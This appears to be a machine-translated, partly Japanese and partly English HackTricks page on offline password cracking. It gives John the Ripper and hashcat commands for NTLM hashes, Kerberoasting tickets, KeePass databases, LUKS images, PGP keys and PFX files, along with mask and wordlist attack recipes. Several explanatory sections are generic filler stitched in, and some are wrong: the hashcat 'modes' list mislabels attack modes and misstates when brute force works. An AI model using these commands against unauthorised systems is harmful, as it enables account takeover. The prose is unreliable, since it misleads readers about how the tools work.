NTLM ハッシュは、Windows システムでパスワードを保護するために使用されるものであり、ユーザーのパスワードをハッシュ化して保存します。NTLM クラッキングでは、ハッシュを解読することで、元のパスワードを取得することが目的となります。

NTLM クラッキングには、さまざまなツールやリソースが利用されます。一般的なツールには、John the Ripper、Hashcat、Cain & Abel などがあります。これらのツールは、高速なハッシュクラッキングを実行するための機能を提供します。

NTLM クラッキングは、セキュリティ評価やペネトレーションテストにおいて、パスワードの弱さを特定するために使用されます。また、パスワードの再利用や不正アクセスの可能性を評価するためにも利用されます。

NTLM クラッキングは、適切な許可を得た場合にのみ実施されるべきであり、不正な活動やシステムへの侵入を目的としてはなりません。セキュリティの専門家や認定されたエキスパートによって実施されるべきです。
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
# Keepass

Keepassは、パスワード管理ツールであり、パスワードの保存と安全な管理を提供します。Keepassは、強力な暗号化アルゴリズムを使用してパスワードデータベースを保護し、マスターパスワードを使用してアクセスを制御します。

Keepassのブルートフォース攻撃は、パスワードデータベースのマスターパスワードを解読するために使用される攻撃手法です。ブルートフォース攻撃では、すべての可能な組み合わせを試行し、正しいパスワードを見つけるまで続けます。

ブルートフォース攻撃は、非常に時間がかかる場合があります。しかし、強力なパスワードを使用している場合や、パスワードの長さが十分に長い場合は、攻撃が困難になります。

Keepassのブルートフォース攻撃を防ぐためには、強力なマスターパスワードを使用し、パスワードデータベースを定期的にバックアップすることが重要です。また、Keepassの最新バージョンを使用し、セキュリティのアップデートを適用することも推奨されます。

Keepassは、パスワード管理のための便利なツールですが、適切なセキュリティ対策を講じることが重要です。
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### ケベロースティング

Keberoastingは、Active Directory（AD）環境で使用されるサービスアカウントのパスワードを解読するための攻撃手法です。この攻撃は、Kerberos認証プロトコルの脆弱性を利用しています。

攻撃者は、AD環境内のサービスアカウントのユーザー名を特定し、そのユーザー名に関連付けられたサービスチケットを取得します。次に、攻撃者はサービスチケットをオフラインで解読し、サービスアカウントのパスワードを取得します。

Keberoasting攻撃は、攻撃者がAD環境内の特権を持たない場合でも実行できます。攻撃者は、一般的には低特権のユーザーとしてADにアクセスし、攻撃を実行します。

この攻撃手法は、パスワードが強力なハッシュ関数でハッシュ化されている場合でも有効です。攻撃者は、オフラインでハッシュを解読することにより、パスワードを取得します。

Keberoasting攻撃を防ぐためには、強力なパスワードポリシーを実装し、サービスアカウントのパスワードを定期的に変更することが重要です。また、特権のないユーザーに対しても適切なアクセス制御を実施することが必要です。
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### ラックスイメージ

#### 方法1

インストール: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### メソッド2

Brute force is a common method used to crack passwords or encryption keys by systematically trying all possible combinations until the correct one is found. It is a time-consuming process that requires a lot of computational power, but it can be effective if the password or encryption key is weak or if the attacker has access to a large amount of computing resources.

To perform a brute force attack, the attacker needs a list of possible passwords or encryption keys to try. This list can be generated using various techniques, such as using a dictionary of common passwords, generating all possible combinations of characters, or using previously leaked passwords from data breaches.

Once the list of possible passwords or encryption keys is obtained, the attacker uses a program or script to systematically try each one until the correct one is found. This process can take a long time, especially if the password or encryption key is complex and the list of possible options is large.

To speed up the brute force attack, attackers can use techniques such as parallel processing, distributed computing, or using specialized hardware like graphics processing units (GPUs) or field-programmable gate arrays (FPGAs). These techniques allow the attacker to try multiple passwords or encryption keys simultaneously, significantly reducing the time required to find the correct one.

It is important to note that brute force attacks are not always successful. If the password or encryption key is strong and the attacker does not have access to sufficient computational resources, the attack may take an impractically long time or may not succeed at all. Additionally, many systems have built-in protections against brute force attacks, such as limiting the number of login attempts or implementing account lockouts after a certain number of failed attempts.

Overall, brute force attacks can be a powerful tool for hackers, but they require significant computational resources and may not always be successful. It is important for individuals and organizations to use strong passwords and encryption keys to protect their sensitive information from brute force attacks.
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
別のLuks BFチュートリアル：[http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### PGP/GPGの秘密鍵

Brute forcing a PGP/GPG private key is an extremely difficult task due to the large key space. The private key is typically protected by a passphrase, which adds an additional layer of security. However, if the passphrase is weak or easily guessable, it may be possible to brute force the key.

To brute force a PGP/GPG private key, you would need to generate all possible key combinations and test each one until the correct passphrase is found. This process can be time-consuming and resource-intensive, especially for longer and more complex passphrases.

There are several tools available that can assist in brute forcing PGP/GPG private keys, such as `pgcrack` and `gpg2john`. These tools automate the process of generating key combinations and testing them against the private key.

It is important to note that brute forcing a PGP/GPG private key is generally considered unethical and illegal without proper authorization. It is recommended to only use these techniques for legitimate purposes, such as recovering a forgotten passphrase or testing the strength of your own private key.
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)を使用して、次にjohnを使用します。

### Open Office Pwd Protected Column

パスワードで保護された列を持つxlsxファイルがある場合、次の手順で保護を解除できます：

* **Googleドライブにアップロード**し、パスワードは自動的に削除されます
* 手動で**削除**するには：
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### PFX証明書

PFX証明書は、公開鍵暗号方式で使用されるデジタル証明書の一種です。PFXは、個人情報交換ファイル（Personal Information Exchange）の略称です。PFX証明書は、秘密鍵と公開鍵のペアを含み、一般的にはパスワードで保護されています。

PFX証明書は、デジタル署名や暗号化などのセキュリティ関連の操作に使用されます。PFX証明書を使用すると、データの機密性や整合性を確保することができます。

PFX証明書の作成や管理には、さまざまなツールやリソースが利用されます。一般的な手法としては、PFX証明書を作成するためのツールを使用し、秘密鍵と公開鍵のペアを生成します。また、PFX証明書を保護するために、強力なパスワードを設定することも重要です。

PFX証明書は、セキュリティの向上やデジタル通信の保護に役立つ重要なツールです。正しく管理され、適切に使用されることで、データの安全性を確保することができます。
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**し、自動化することができます。\
今すぐアクセスを取得してください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## ツール

**ハッシュの例：** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### ハッシュ識別子
```bash
hash-identifier
> <HASH>
```
### ワードリスト

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **ワードリスト生成ツール**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 設定可能なベース文字、キーマップ、ルートを持つ高度なキーボードウォークジェネレーター。
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### Johnの変異

_**/etc/john/john.conf**_を読み、それを設定します。
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Hashcatの攻撃方法

* **ワードリスト攻撃** (`-a 0`) とルール

**Hashcat**にはすでに**ルールが含まれたフォルダ**がありますが、[**ここで他の興味深いルールを見つけることができます**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules)。
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **ワードリスト組み合わせ**攻撃

hashcatを使用して、2つのワードリストを1つに組み合わせることができます。\
もし、リスト1には単語**"hello"**が含まれており、2つ目のリストには単語**"world"**と**"earth"**が2行ずつ含まれていた場合、`helloworld`と`helloearth`という単語が生成されます。
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **マスク攻撃** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* ワードリスト + マスク (`-a 6`) / マスク + ワードリスト (`-a 7`) 攻撃
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Hashcatのモード

Hashcatは、さまざまなハッシュアルゴリズムをクラックするためのさまざまなモードを提供しています。以下にいくつかの一般的なモードを示します。

- **ハッシュモード**（モード0）：ハッシュ値を解読するための基本的なモードです。ハッシュ値を入力として受け取り、対応する平文を見つけることを試みます。

- **ハイブリッドモード**（モード6）：辞書攻撃とルールベースの攻撃を組み合わせた攻撃方法です。辞書ファイルとルールファイルを使用して、パスワードを推測します。

- **ルールベースの攻撃**（モード7）：ルールファイルを使用して、既知のパスワードパターンに基づいてパスワードを生成します。これにより、一般的なパスワードの変形やパターンを網羅的に試すことができます。

- **組み合わせ攻撃**（モード1）：複数の辞書ファイルを組み合わせてパスワードを推測します。辞書ファイルの組み合わせを試すことで、より多くのパスワードのバリエーションを網羅的に試すことができます。

- **ブルートフォース攻撃**（モード3）：すべての可能な組み合わせを試す攻撃方法です。これは非常に時間がかかる場合がありますが、パスワードが非常に強力な場合に有効です。

これらのモードは、さまざまな攻撃シナリオに対応しており、ハッシュのクラックに使用されることがあります。
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
# Linuxハッシュのクラック - /etc/shadowファイル

## 概要

Linuxシステムでは、ユーザーのパスワードは/etc/shadowファイルにハッシュ化されて保存されます。このファイルは通常、rootユーザーのみがアクセスできるようになっています。しかし、ハッシュ関数の性質上、ハッシュ値から元のパスワードを復元することは不可能ではありません。このため、ハッシュを解読することで、ユーザーのパスワードを取得することができます。

## ブルートフォース攻撃

ブルートフォース攻撃は、ハッシュ値を解読するための一般的な手法です。この攻撃では、可能なすべてのパスワードの組み合わせを試し、ハッシュ値と一致するものを見つけることを目指します。

以下は、ブルートフォース攻撃の手順です。

1. ハッシュ値を取得します。/etc/shadowファイルからユーザーのハッシュ値を抽出します。
2. パスワードリストを作成します。攻撃者は、一般的なパスワードや辞書攻撃に使用するためのパスワードリストを作成します。
3. パスワードリストを使用して攻撃を開始します。攻撃者は、パスワードリスト内の各パスワードをハッシュ化し、ハッシュ値と一致するかどうかを確認します。
4. 一致するパスワードが見つかるまで繰り返します。攻撃者は、すべてのパスワードを試すまで繰り返します。

## リソース

ブルートフォース攻撃を実行するためには、以下のリソースが必要です。

- パスワードリスト: ブルートフォース攻撃に使用するパスワードのリストです。一般的なパスワードや辞書攻撃に使用されます。
- ハッシュクラッキングツール: ブルートフォース攻撃を自動化するためのツールです。例えば、John the RipperやHashcatなどがあります。

## 対策

ユーザーのパスワードを保護するためには、以下の対策を実施することが重要です。

- 強力なパスワードポリシーの設定: ユーザーには、長さや文字の種類などに制約のある強力なパスワードを設定するように指導します。
- パスワードのハッシュ化: パスワードはハッシュ関数を使用して保存されるべきです。また、ソルトを使用することで、同じパスワードでも異なるハッシュ値が生成されるようにします。
- パスワードリストの禁止: システムは一般的なパスワードや辞書攻撃に使用されるパスワードリストの使用を禁止するように設定されるべきです。

以上がLinuxハッシュのクラックに関する情報です。ユーザーのパスワードを保護するためには、適切な対策を実施することが重要です。
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# Windowsハッシュのクラック

## 概要

Windowsオペレーティングシステムでは、ユーザーのパスワードはハッシュ形式で保存されます。ハッシュは元のパスワードを保護するために使用され、クラッキングすることでパスワードを復元することができます。このセクションでは、Windowsハッシュをクラックするための一般的な手法とリソースについて説明します。

## ブルートフォース攻撃

ブルートフォース攻撃は、すべての可能な組み合わせを試すことによってパスワードを推測する手法です。この攻撃は非常に時間がかかる場合がありますが、十分な計算リソースと時間があれば成功する可能性があります。

以下は、Windowsハッシュをクラックするためのブルートフォース攻撃の手順です。

1. ハッシュの取得: ターゲットのWindowsマシンからハッシュを取得します。これは、SAMファイルやNTDS.ditファイルから行うことができます。

2. パスワードリストの作成: ブルートフォース攻撃では、パスワードリストが必要です。一般的なパスワードや辞書攻撃に使用される単語リストを使用することができます。

3. ブルートフォースツールの使用: ブルートフォース攻撃を実行するためのツールを使用します。一般的なツールには、John the RipperやHashcatなどがあります。

4. 攻撃の実行: ツールを使用して、パスワードリストの各エントリをハッシュに適用します。ツールは、一致するパスワードを見つけるまで続けます。

5. パスワードの復元: ツールが一致するパスワードを見つけた場合、それを復元します。これにより、Windowsアカウントにアクセスできるようになります。

## ハードウェアアクセラレーションの使用

ブルートフォース攻撃は非常に時間がかかるため、ハードウェアアクセラレーションを使用することで攻撃速度を向上させることができます。ハードウェアアクセラレーションは、GPU（グラフィックス処理ユニット）やASIC（アプリケーション固有集積回路）などの特殊なハードウェアを使用して、パスワードのクラックを高速化します。

ハードウェアアクセラレーションを使用するためには、適切なツールと互換性のあるハードウェアが必要です。一部のツールは、特定のGPUやASICをサポートしています。

## クラウドベースの攻撃

ブルートフォース攻撃は、クラウドベースのリソースを使用して実行することもできます。クラウドベースの攻撃では、クラウドプロバイダの計算リソースを利用して、膨大な計算能力を持つ仮想マシンを使用します。

クラウドベースの攻撃を実行するためには、クラウドプロバイダのアカウントを作成し、適切な仮想マシンをセットアップする必要があります。一部のクラウドプロバイダは、ブルートフォース攻撃に特化した仮想マシンイメージを提供しています。

## まとめ

Windowsハッシュのクラックには、ブルートフォース攻撃が一般的に使用されます。この攻撃は時間がかかる場合がありますが、ハードウェアアクセラレーションやクラウドベースのリソースを使用することで攻撃速度を向上させることができます。適切なツールとリソースを使用して、Windowsハッシュのクラックを試みることができます。
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
# Brute Force

Brute force is a common method used to crack application hashes. It involves systematically trying every possible combination of characters until the correct password is found.

## Dictionary Attack

A dictionary attack is a type of brute force attack that uses a pre-defined list of commonly used passwords, known as a dictionary, to crack hashes. This method is effective against weak passwords that are easily guessable.

## Hybrid Attack

A hybrid attack combines elements of both brute force and dictionary attacks. It involves trying all possible combinations of characters, including variations of dictionary words, to crack hashes. This method is effective against stronger passwords that are not easily guessable.

## Rainbow Tables

Rainbow tables are precomputed tables of hashes and their corresponding plaintext passwords. They can be used to quickly crack hashes by looking up the plaintext password in the table. However, rainbow tables can be large and require a significant amount of storage space.

## GPU Acceleration

Graphics Processing Units (GPUs) can be used to accelerate the brute force cracking process. GPUs are highly parallel processors that can perform many calculations simultaneously, making them well-suited for password cracking. Tools like hashcat and John the Ripper support GPU acceleration.

## Online Hash Cracking Services

There are online services available that offer hash cracking capabilities. These services typically use powerful hardware and distributed computing to crack hashes quickly. However, it is important to use these services responsibly and ensure that you have the legal right to crack the hashes.

## Conclusion

Brute force attacks, dictionary attacks, hybrid attacks, rainbow tables, GPU acceleration, and online hash cracking services are all methods that can be used to crack application hashes. Each method has its own advantages and disadvantages, and the choice of method will depend on factors such as the strength of the password and the available resources.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も**高度なコミュニティツール**によって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
